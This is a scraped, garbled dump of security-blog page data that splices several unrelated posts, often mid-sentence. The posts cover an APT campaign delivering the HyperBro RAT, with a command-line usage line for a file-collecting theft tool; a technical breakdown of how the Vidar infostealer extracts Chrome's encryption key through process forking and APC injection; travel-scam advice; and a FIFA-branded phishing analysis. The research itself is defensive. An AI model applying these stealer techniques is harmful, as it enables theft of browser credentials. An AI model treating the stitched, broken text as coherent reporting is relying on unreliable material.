scanners.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eInfection Chain\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.\u003c/p\u003e\u003cp\u003eDate: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)\u0026nbsp;\u003cbr\u003eSubject: Re: Perform a firmware update on the server\u003c/p\u003e\u003cp\u003eXXXXXX_update.exe\u0026nbsp;\u003c/p\u003e\u003cp\u003e(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)\u003c/p\u003e\u003cp\u003eThis archive drops three already familiar files – Symantec’s \u003cem\u003ethinprobe.exe\u003c/em\u003e, malicious \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e, and \u003cem\u003ethumb.db\u003c/em\u003e. The malicious DLL is used for DLL sideloading, decrypting and decompressing \u003cem\u003ethumb.db\u003c/em\u003e and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by \u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003eKaspersky[1]\u003c/a\u003e and \u003ca Every directory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided date boundaries (in UTC), their full paths are written down into the output file. These paths are delimited by Windows line delimiters and they are encoded in 16-bit Unicode.\u003c/p\u003e\u003cp\u003eBelow you will see a part of an error message, providing us the information about how this utility is used:\u003c/p\u003e\u003cp\u003e\u003cem\u003eT040ClientLite.exe suffix .txt,.xls scanDirs E:\\\\test,E:\\\\test1 output E:\\\\test\\\\output.txt startEditDate 2020/04/26 endEditDate 2020/04/27\u003c/em\u003e\u003c/p\u003e\u003cp\u003eMore generally, the command’s format is:\u003c/p\u003e\u003cp\u003e\u003cem\u003eT040ClientLite.exe suffix \u0026lt;file extensions\u0026gt; scanDirs \u0026lt;directories\u0026gt; output \u0026lt;output file\u0026gt; startEditDate \u0026lt;date\u0026gt; endEditDate \u0026lt;date\u0026gt;\u003c/em\u003e\u003c/p\u003e\u003ch2\u003e\u003cstrong\u003eInformation Collector\u003c/strong\u003e\u003c/h2\u003e\u003cp\u003eThe Information Collector focuses on removable drives. are constantly evolving, and so are the techniques they use to bypass \u003ca href=\"https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eApplication-Bound Encryption (ABE)\u003c/a\u003e. In recent weeks, Vidar has been among the most actively developed stealers and, apart from \u003ca href=\"https://x.com/GenThreatLabs/status/2064836539952361976\" target=\"_blank\" rel=\"noreferrer noopener\"\u003emultiple updates to its string obfuscation\u003c/a\u003e and \u003ca href=\"https://x.com/GenThreatLabs/status/2061462524604649840\" target=\"_blank\" rel=\"noreferrer noopener\"\u003ea reworked approach to protecting its configuration\u003c/a\u003e, it has also introduced a novel technique for bypassing ABE. And while there have been many other changes in Vidar lately, with new versions dropping every week, in this blog post we focus solely on the ABE bypass and its technical aspects.\u0026nbsp;\u003cbr\u003e\u0026nbsp;\u003c/p\u003e\u003ch2\u003eThe ABE Bypass\u0026nbsp;\u003c/h2\u003e\u003cp\u003eFrom a high-level perspective, Vidar’s approach to bypassing ABE is somewhat similar to that of Remus/Lumma, in that both try to extract the \u003ccode\u003ev20_master_key\u003c/code\u003e directly from the browser’s memory. What sets them apart, however, is how they achieve it. Since we’ve already covered the inner workings of ABE in earlier posts (\u003ca href=\"https://www.gendigital.com/blog/insights/research/remus-64bit-variant-of-lumma-stealer\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eRemus\u003c/a\u003e, \u003ca href=\"https://www.gendigital.com/blog/insights/research/voidstealer-abe-bypass\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eVoidStealer\u003c/a\u003e), we don’t revisit them here and focus instead on the bypass itself. For readers interested in the broader background, we encourage checking those earlier posts.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn short, the end goal of infostealers is to obtain the \u003ccode\u003ev20_master_key\u003c/code\u003e, as it alone is sufficient for decrypting any ABE-protected data tied to a specific application. This key can be obtained in one of two ways: either from disk, where it is protected by two layers of \u003ccode\u003eCryptProtectData\u003c/code\u003e (one applied in the context of the logged-in user and one as \u003ccode\u003eNT AUTHORITY\\SYSTEM\u003c/code\u003e), or from the browser’s memory – the direction Vidar took.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIn memory, however, the key is kept protected with \u003ccode\u003eCryptProtectMemory\u003c/code\u003e using the \u003ccode\u003eCRYPTPROTECTMEMORY_SAME_PROCESS\u003c/code\u003e flag. This ensures that even if an attacker manages to read the encrypted form of the key from memory, they cannot simply decrypt it (they would need to invoke the complementary \u003ccode\u003eCryptUnprotectMemory\u003c/code\u003e function directly from within the browser process). That leaves attackers with two problems to solve: how to find the encrypted key in memory, and how to get it decrypted.\u0026nbsp;\u003c/p\u003e\u003ch2\u003eLocating the v20_master_key in Browser’s Memory\u0026nbsp;\u003c/h2\u003e\u003cp\u003eVidar’s approach to locating the encrypted \u003ccode\u003ev20_master_key\u003c/code\u003e in memory involves scanning the entire memory of a running browser for a specific pattern. But that first requires a browser process to scan.\u0026nbsp;\u003c/p\u003e\u003cp\u003eWhen the target browser is already running, Vidar reuses the existing process. However, it doesn’t read its memory directly. Instead, it creates a fork of it using \u003ccode\u003eNtCreateProcessEx\u003c/code\u003e with \u003ccode\u003eSectionHandle\u003c/code\u003e set to \u003ccode\u003eNULL\u003c/code\u003e, instructing the kernel to clone the address space of the process specified by the \u003ccode\u003eParentProcess\u003c/code\u003e as a copy-on-write mapping. The resulting process has no threads and is never resumed – it exists purely as a static memory snapshot.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eTo perform the fork, Vidar first opens a handle to the target browser via \u003ccode\u003eOpenProcess\u003c/code\u003e with \u003ccode\u003ePROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS | PROCESS_VM_READ\u003c/code\u003e, falling back to \u003ccode\u003ePROCESS_CREATE_PROCESS\u003c/code\u003e if the initial call fails. It then passes this handle as the \u003ccode\u003eParentProcess\u003c/code\u003e argument to \u003ccode\u003eNtCreateProcessEx\u003c/code\u003e, requesting \u003ccode\u003ePROCESS_ALL_ACCESS\u003c/code\u003e on the resulting child. If the fork fails, Vidar falls back to scanning the live browser process directly.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-06/vidar_blogpost_figure_01.jpg.webp?itok=a0E1a5xW 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-06/vidar_blogpost_figure_01.jpg.webp?itok=JbjnwDnR 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":303},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-06/vidar_blogpost_figure_01.jpg.webp?itok=DB6yookn 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-06/vidar_blogpost_figure_01.jpg.webp?itok=1HwyA59k 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":230},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-06/vidar_blogpost_figure_01.jpg.webp?itok=8YI9qDxS 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-06/vidar_blogpost_figure_01.jpg.webp?itok=BSGKHXK_ 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":179}],"caption":"Figure 1: Vidar forking a browser process. ","url":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-06/vidar_blogpost_figure_01.jpg.webp?itok=8YI9qDxS","link":""}]},{"bundle":"rich_text","content":"\u003cp\u003eIf no target browser process is found running, Vidar creates a new isolated desktop via \u003ccode\u003eCreateDesktopA\u003c/code\u003e, assigns it a name of the form \u003ccode\u003ev20_%d\u003c/code\u003e (where \u003ccode\u003e%d\u003c/code\u003e is replaced with the browser’s index in Vidar’s configuration), and launches the target browser in there. In the case of Vidar version 2.1, the browser is launched with the command line \u003ccode\u003e--no-first-run --disable-gpu about:blank\u003c/code\u003e, although the exact command line varies across versions. Since modern browsers use a multi-process architecture, there are typically multiple processes matching a given browser. Vidar enumerates all of them (up to 64) and applies the fork-and-scan procedure to each one independently.\u0026nbsp;\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-06/vidar_blogpost_figure_02.jpg.webp?itok=AJrFaBHE 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2026-06/vidar_blogpost_figure_02.jpg.webp?itok=5LsKVVrj 2x","media":"(min-width: 1020px)","type":"image/webp","width":1170,"height":547},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2026-06/vidar_blogpost_figure_02.jpg.webp?itok=4rj4cTpo 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2026-06/vidar_blogpost_figure_02.jpg.webp?itok=qfC2N17D 2x","media":"(min-width: 720px)","type":"image/webp","width":890,"height":416},{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2026-06/vidar_blogpost_figure_02.jpg.webp?itok=Q_EiFHL9 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2026-06/vidar_blogpost_figure_02.jpg.webp?itok=tYP-atq_ 2x","media":"(min-width: 420px)","type":"image/webp","width":690,"height":322}],"caption":"Figure 2: Vidar launching a browser in a new desktop. To read it, Vidar creates a second fork of the browser process and reads the key from the same address using \u003ccode\u003eNtReadVirtualMemory\u003c/code\u003e. It then compares the result against a snapshot of the encrypted key taken from the first fork before the APC call – if the data is unchanged, decryption failed, and Vidar moves on to the next browser process’s candidate.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIf the data differs, Vidar uses the same second fork to perform an additional verification: it scans the forked process’s memory for the byte sequence \u003ccode\u003ev20\u003c/code\u003e and, treating each match as a potentially ABE-encrypted entry (cookie, password), attempts AES-256-GCM decryption with the key candidate using \u003ccode\u003eBCryptDecrypt\u003c/code\u003e (successful GCM tag verification confirms that the key is correct).\u0026nbsp;\u003c/p\u003e\u003cp\u003eWhenever the data has changed (indicating that decryption of the key took place), Vidar re-encrypts the key in the browser’s memory by injecting another APC with \u003ccode\u003eCryptProtectMemory\u003c/code\u003e as the routine, preserving the browser’s state. If no candidate produced a successful decryption (i.e., the data remained unchanged after every APC call), Vidar takes a more aggressive approach: it terminates all browser instances, restarts the browser, and repeats the entire scan-decrypt-verify cycle.\u0026nbsp;\u003c/p\u003e\u003cp\u003eBy abusing APC injections instead of the more traditional approach of injecting code via \u003ccode\u003eNtWriteVirtualMemory\u003c/code\u003e that performs the decryption, Vidar trades one suspicious behavior for another. APC injections are arguably less common and may thus slip past some detection systems, though they are still well-known techniques monitored by AV and EDR solutions. But that is the nature of ABE bypasses – each has its own advantages and disadvantages, and that’s exactly why infostealers keep inventing new ones. \u0026nbsp;\u003c/p\u003e\u003ch2\u003eIndicator of Compromise (IoC)\u0026nbsp;\u003c/h2\u003e\u003cp\u003e459daa809751e73f60fbbe4384a7d1653c36bb06945e4eb3635270924241100a (Vidar 2.1)\u0026nbsp;\u003c/p\u003e"}],"itemState":"published","timeToRead":"13","translations":[],"originalLanguagePost":{},"mediaType":{"video":false,"audio":false},"socialMediaMetaImage":"https://www.gendigital.com/blog/sites/default/files/styles/social_media_meta/public/2026-06/vidar_blogpost_header.jpg?h=5e1f4f74\u0026itok=ejS-nCne","relatedPosts":[{"urlAlias":"/blog-post/flight-cancelled-refund-message-scam","title":"Your flight was cancelled. have a summer flight booked. You have seen the headlines about jet fuel shortages, cancelled routes and higher travel costs. Then a text message arrives: your flight has been affected, and you need to click a link to confirm your refund or rebook before the offer expires.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThat message feels plausible because the situation around it is real. In April, \u003ca href=\"https://www.iata.org/en/pressroom/2026-releases/2026-04-17-01/\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eIATA warned\u003c/a\u003e that Europe could start seeing flight cancellations by the end of May if jet fuel shortages materialized. Airlines and governments have since been trying to reassure travelers, while also publishing guidance on passenger rights, refunds and re-routing.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eThat is exactly the kind of confusion scammers like. They do not need to cause the disruption, they only need to arrive at the right moment, with the right brand logo and the right sense of urgency.\u0026nbsp;\u003c/p\u003e\u003ch4\u003eWhy travel disruption works so well as a scam hook\u0026nbsp;\u003c/h4\u003e\u003cp\u003eMost scam messages fail because they arrive out of context. A random refund email from an airline you never use is easy to ignore. A refund message from the airline you are flying with next week, during a period of public travel disruption, is different.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe scammer’s job is to make you think: “This could be real.”\u0026nbsp;\u003c/p\u003e\u003cp\u003eThat can happen in several ways. You might receive a fake cancellation email that links to a refund form. You might search for an airline’s customer service number and land on a fake support page. You might post publicly on social media asking an airline for help, then receive a reply from an account that looks official. Or you might get a WhatsApp message that knows your hotel name, travel dates or booking reference.\u0026nbsp;\u003c/p\u003e\u003cp\u003eEach version uses the same pressure point: you are worried about losing money, losing your flight or being stranded.\u0026nbsp;\u003c/p\u003e\u003cp\u003eCriminals are already using disruption this way. In March, \u003ca href=\"https://www.theguardian.com/money/2026/mar/15/travel-scam-airline-accounts-fake-refunds-iran-war-flight-disruption\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eThe Guardian reported\u003c/a\u003e that fake airline support accounts were targeting travelers affected by Middle East flight disruption. Some victims were looking for help or refunds, then received replies from accounts pretending to represent airlines. The scam moved into direct messages, where victims were asked for details and sent links that led to money being taken instead of refunded.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe jet fuel story gives scammers another pretext. A message can claim that your flight was cancelled, your fare changed, your fuel surcharge failed, or your refund must be claimed within a few hours. None of those claims needs to be true to be effective.\u0026nbsp;\u003c/p\u003e\u003ch4\u003eThe scam may start before the message arrives\u0026nbsp;\u003c/h4\u003e\u003cp\u003eA fake travel message becomes much harder to spot when it includes real information.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis is the idea behind \u003ca href=\"https://www.gendigital.com/blog/insights/research/reservation-hijack-scam\" target=\"_blank\" rel=\"noreferrer noopener\"\u003eReservation Hijack scams\u003c/a\u003e, a form of targeted phishing where cybercriminals use real booking details to make a message look legitimate. In some cases, attackers may use information exposed through breaches or compromised travel systems. In other cases, they collect details from emails, social media posts, previous leaks or fake customer service interactions. Gen has previously described Reservation Hijack scams as scams that use real hotel booking details to make fraudulent payment or verification requests feel authentic.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eThat distinction matters. A scam message does not need your credit card number to fool you. Knowing your name, your destination, your travel dates and your booking platform may be enough.\u0026nbsp;\u003c/p\u003e\u003ch4\u003eWhat these scams can look like\u0026nbsp;\u003c/h4\u003e\u003cp\u003eA travel disruption scam usually does not begin with a strange offer. It begins with something boring and administrative. That is part of the trick.\u0026nbsp;\u003c/p\u003e\u003cp\u003eYou may see messages like:\u0026nbsp;\u003c/p\u003e\u003cp\u003e“Your flight has been cancelled due to fuel supply issues. Claim your refund here.”\u0026nbsp;\u003c/p\u003e\u003cp\u003e“Your rebooking is pending. Confirm passenger details within two hours.”\u0026nbsp;\u003c/p\u003e\u003cp\u003e“Additional airport tax or fuel surcharge is required to keep your booking.”\u0026nbsp;\u003c/p\u003e\u003cp\u003e“Your hotel reservation will be cancelled unless payment is verified.”\u0026nbsp;\u003c/p\u003e\u003cp\u003e“Due to high call volume, please continue this request on WhatsApp.”\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe exact wording changes, but the structure is familiar. There is a problem, a deadline and a link. The message may also move you away from the official channel into SMS, WhatsApp, Telegram, direct messages or a phone call. Once that happens, the scammer controls the conversation.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThere is another detail worth watching: some messages do not ask for money immediately. They start by asking for your booking reference, last name, phone number or one-time password. That can still be dangerous. Those details can help scammers access a booking, impersonate you to customer support, reset an account or make the next message more convincing.\u0026nbsp;\u003c/p\u003e\u003ch4\u003eYour real passenger rights can be used against you\u0026nbsp;\u003c/h4\u003e\u003cp\u003eIf an airline cancels your flight, you may have rights to a refund, re-routing or assistance, depending on where you are travelling and the rules that apply. The European Commission said passengers affected by cancellations continue to have rights to reimbursement, re-routing or return, airport assistance and compensation for last-minute cancellations in relevant circumstances. It also said airlines cannot retroactively add fuel surcharges to already published final ticket prices.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eThat information is useful for travelers, but it is also useful for scammers.\u0026nbsp;\u003c/p\u003e\u003cp\u003eA fake refund message becomes more believable when people already know refunds are possible. A fake rebooking link becomes more believable when airlines are genuinely changing schedules. A fake “fuel surcharge” demand becomes more dangerous when fuel prices are in the news, even though legitimate retroactive charges may not be allowed in many cases.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThis is why the safest route is not to judge the message only by whether the story sounds plausible. During travel disruption, many scam stories will sound plausible. Judge the channel instead.\u0026nbsp;\u003c/p\u003e\u003ch4\u003eHow to check before you click\u0026nbsp;\u003c/h4\u003e\u003cp\u003eStart from the airline or booking platform’s official app or website. Do not use the link in the message. Open the app yourself, type the website address yourself, or use the contact details listed on your original booking confirmation.\u0026nbsp;\u003c/p\u003e\u003cp\u003eCheck whether the same cancellation, refund or payment request appears inside your account. If the message is real, the airline or hotel should be able to confirm it through an official channel.\u0026nbsp;\u003c/p\u003e\u003cp\u003eBe careful with social media support. If an account replies to your public complaint, check whether it is linked from the airline’s official website. Look at the handle carefully. Fake support accounts often copy logos and names, but have small differences in spelling, low follower counts or recently created profiles. The Guardian reported that fraudsters often scan social media for passengers trying to contact legitimate airline accounts and reply to them first, which makes the scam harder to spot.\u0026nbsp;\u0026nbsp;\u003c/p\u003e\u003cp\u003eDo not share one-time passwords, payment card details or login credentials with anyone who contacts you unexpectedly. A real airline or hotel does not need your banking OTP to send you a refund.\u0026nbsp;\u003c/p\u003e\u003cp\u003eBe especially suspicious of pressure. “You have 30 minutes to claim your refund” is not customer service. It is a tactic.\u0026nbsp;\u003c/p\u003e\u003ch4\u003eWhat to do if you already clicked\u0026nbsp;\u003c/h4\u003e\u003cp\u003eIf you entered payment details, contact your bank or card provider immediately. Ask whether the transaction can be blocked or reversed, and request a new card if needed.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIf you shared login details for an airline, hotel or booking platform, change the password from the official site or app. Use a unique password, not one you use elsewhere. Turn on two-factor authentication where it is available.\u0026nbsp;\u003c/p\u003e\u003cp\u003eIf you shared a one-time password or authentication code, assume the account may have been accessed. Check your booking details, payment methods and recent account activity.\u0026nbsp;\u003c/p\u003e\u003cp\u003eReport the scam to the airline, hotel or booking platform being impersonated. If the scam came through social media, report the account as impersonation. If money was taken, report it to the relevant fraud authority in your country.\u0026nbsp;\u003c/p\u003e\u003ch4\u003eThe real lesson for summer travel\u0026nbsp;\u003c/h4\u003e\u003cp\u003eTravel disruption changes how people behave. They search for support numbers in a hurry. They post publicly because customer service queues are long. They accept strange instructions because they are worried about losing a flight or refund.\u0026nbsp;\u003c/p\u003e\u003cp\u003eScammers build around that behavior.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe safest assumption is simple: if a message about your flight, hotel or refund creates urgency and gives you a link, pause. Go back to the official source. A real cancellation will still be there when you check through the airline or booking platform. A scammer needs you to act before you do.\u0026nbsp;\u003c/p\u003e"}],"itemState":"published","timeToRead":"8","translations":[],"originalLanguagePost":{},"mediaType":{"video":false,"audio":false},"socialMediaMetaImage":"https://www.gendigital.com/blog/sites/default/files/styles/social_media_meta/public/2026-06/threat%20flight%20canceled%20image.jpg?h=8c9c35ae\u0026itok=33YI5TgM","relatedPosts":[{"urlAlias":"/blog-post/inside-vidar-abe-bypass","title":"Inside fake job interview page is easier to trust than a fake ticket shop.\u003c/p\u003e\u003cp\u003eIn samples reviewed by Gen threat researchers, scammers used branded hiring pages that looked like ordinary recruitment flows: a company logo, a recruiter profile, a 30-minute meeting, and a button to continue with Google or Facebook. There was no attachment to open and no software to install. The credential theft attempt sat inside a step many job applicants already expect: signing in to schedule a call.\u003c/p\u003e\u003cp\u003eFIFA is an obvious lure ahead of the 2026 World Cup. On May 22, ESET reported fake FIFA-themed websites that copied ticket and merchandise flows to steal money and personal data. Our researchers later found another FIFA-themed domain, hxxps://fifa-mg[.]shop, which followed a naming pattern not mentioned in that report. Domains like these can be short-lived, often appearing for hours or days before they are blocked, abandoned, or taken down.\u003c/p\u003e\u003cp\u003eOur researchers also found a different kind of FIFA lure: hxxps://fifahiring[.]com, a fake hiring page that encouraged users to schedule a call with an alleged FIFA recruiter. When a user tried to register with a personal Gmail address, the page asked for a business email instead. The page was steering victims toward credentials with more value: accounts that could provide access to a company used FIFA branding, presented a recruiter identity, and copied parts of the experience users see on legitimate recruiting and scheduling platforms. The recruiter’s name and photo appeared to match a real LinkedIn profile, which made the page feel more credible. For publication, we should keep that person’s identity redacted.\u003c/p\u003e\u003cp\u003eThe domain did not match FIFA’s real hiring infrastructure. FIFA’s legitimate careers pages are jobs.fifa.com and fifa.pinpointhq.com. The fake page used neither. It also loaded the favicon from the real FIFA recruitment site hosted at pinpointhq.com, giving the page a small visual cue borrowed from the legitimate service.\u003c/p\u003e\u003cp\u003eOther signals pointed in the same direction. The domain and certificate were newly created, from May 23. The site used commodity hosting infrastructure, including Vercel and Render, rather than a corporate environment. Those signs are not enough on their own, but they fit the rest of the evidence.\u003c/p\u003e\u003cp\u003eThe login flow was the clearest part. Credentials were posted to:\u003c/p\u003e\u003cp\u003efifeq2026eqbackeq[.]onrender[.]com/api/login\u003c/p\u003e\u003cp\u003eThe Google sign-in prompt was not a real Google authentication window. It was rendered inside the page itself. The visible controls and links did nothing, and the page did not send the user into a genuine Google sign-in flow. According to the analysis, the only Google asset loaded was the favicon, apparently to make the fake window look familiar.\u003c/p\u003e\u003cp\u003eA page can look like it opened a Google login without ever handing control to Google.\u003c/p\u003e\u003cp\u003eResearchers also observed hxxps://careers-fifahiring[.]com, which later became inactive, and hxxps://fifajobs[.]com, which showed the same content and was indexed by Google.\u0026nbsp;\u003c/p\u003e\u003ch4\u003eThe recruitment lure went beyond FIFA\u003c/h4\u003e\u003cp\u003eThe FIFA page was one version of a wider recruitment phishing pattern. The brand can change. The flow stays familiar: recruiter profile, meeting prompt, business email, fake sign-in.\u003c/p\u003e\u003cp\u003eResearchers found similar fake hiring pages abusing other major brands, including \u003cstrong\u003eHeineken, Hilton, Coca-Cola, Netflix, PepsiCo, Delta,\u0026nbsp;\u003c/strong\u003eand\u003cstrong\u003e Spotify\u003c/strong\u003e. flexibility makes the campaign harder to frame as a single World Cup scam. FIFA provides the timely hook, but the mechanism is recruitment phishing. A scammer can swap the logo, recruiter name, and sign-in provider while keeping the same basic path to the victim’s credentials.\u003c/p\u003e\u003ch4\u003eWhy fake recruitment pages work\u003c/h4\u003e\u003cp\u003eRecruitment gives attackers a clean excuse to ask for things that might otherwise raise suspicion.\u003c/p\u003e\u003cp\u003eA candidate expects to click a scheduling link. They expect a recruiter profile. They expect a calendar prompt. In some cases, they may also expect to use a work email, especially for corporate, contractor, or partner-facing roles.\u003c/p\u003e\u003cp\u003eThe fake login window turns that ordinary flow into credential theft. Users are used to “Continue with Google” and “Continue with Facebook” buttons, but the button itself proves nothing. A genuine authentication flow should take the user to the provider’s domain and controls. A fake page can draw a convincing copy while keeping the victim inside the attacker-controlled site.\u003c/p\u003e\u003cp\u003eThe business email prompt is also a warning sign. A page that rejects a personal email and asks for a work address may be trying to raise the value of the stolen account.\u003c/p\u003e\u003ch4\u003eWhat job seekers should check before signing in\u003c/h4\u003e\u003cp\u003eStart from the company’s official careers page, not from a link in a message, ad, search result, or forwarded post. For FIFA, that means checking jobs.fifa.com or fifa.pinpointhq.com, not trusting a domain because it contains “fifa,” “career,” “hiring,” or “jobs.”\u003c/p\u003e\u003cp\u003eLook closely at the domain before entering credentials. Scam pages often add plausible hiring words around a brand name: career, talent, jobs, hiring, portal, or connect. A polished page on a new domain is still a new domain.\u003c/p\u003e\u003cp\u003eTreat the sign-in step as the real checkpoint. If a page offers Google or Facebook login, check whether the flow actually opens a real provider-controlled authentication page. A fake window embedded inside the original site, broken controls, inactive links, or a provider logo used only as decoration should stop the process.\u003c/p\u003e\u003cp\u003eUse security software that includes web and phishing protection. These tools can block known malicious pages before they load, which is especially useful when scam domains look polished, appear in search results, or are shared through otherwise legitimate channels.\u003c/p\u003e\u003ch4\u003eWhat companies can do\u003c/h4\u003e\u003cp\u003eRecruitment pages are public by design, which makes them easy to copy.\u003c/p\u003e\u003cp\u003eSecurity teams should monitor for newly registered domains combining their brand with hiring-related terms. They should also watch for pages that reuse favicons, recruiter photos, job descriptions, and calendar-booking language from legitimate hiring flows.\u003c/p\u003e\u003cp\u003eHR and recruiting teams should make the official hiring path easy to verify. Candidates should not have to guess whether a domain is legitimate. A clear careers page, consistent recruiter communication, and warnings about unofficial scheduling links can remove some of the ambiguity attackers rely on.\u003c/p\u003e\u003ch4\u003eConclusion\u003c/h4\u003e\u003cp\u003eThe fake FIFA hiring page worked because it did not feel unusual. It looked like a normal step in a hiring process.\u003c/p\u003e\u003cp\u003eAttackers do not need to invent new behavior when they can copy one people already trust. A branded scheduling page, a recruiter profile, and a familiar sign-in button can be enough to move a victim from interest to credential entry.\u003c/p\u003e\u003cp\u003eThe decision point is the login. Before entering a work email or password, check the domain, check where the authentication flow really goes, and verify the role through the company’s official careers site. Security software with web and phishing protection adds another layer, especially against short-lived scam pages that may only stay online for hours or Stay informed about the evolving landscape of cyberthreats through our diligent efforts and insights.","socialLinks":[{"service":"instagram","url":"https://www.instagram.com/gendigital/"},{"service":"youtube","url":"https://www.youtube.com/@gendigitalinc"}],"subscriptionListId":"blogs-digest","isLanguageBlog":false,"showOnHomePage":true},"createdDate":"2026-06-11T18:19:51+00:00","createdFriendly":"06.11.2026","createdYmd":"2026-06-11"},{"id":"15461","urlAlias":"/blog-post/residential-proxies","title":"Who's Really Using Your Home Internet Connection?","created":"1781190562","subtitle":"Your home connection could be routing traffic for strangers. Here's how residential proxy networks work, how devices get enrolled and what our telemetry reveals about the risks for consumers.","authors":[{"id":"15286","socialLinks":[],"bio":"","displayName":"Jan Rubín","title":"Threat Research Team Lead","picture":{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_author_bio_large/public/blog-author-pictures/Untitled%20design_2.jpg.webp?h=6a4a5c49\u0026itok=203g40mw 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_author_bio_large_2x/public/blog-author-pictures/Untitled%20design_2.jpg.webp?h=6a4a5c49\u0026itok=ObrRQ8Pr 2x","media":"(min-width: 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_author_bio_small_2x/public/blog-author-pictures/Untitled%20design_2.jpg.webp?h=6a4a5c49\u0026itok=OEVdkY1W 2x","media":"(min-width:
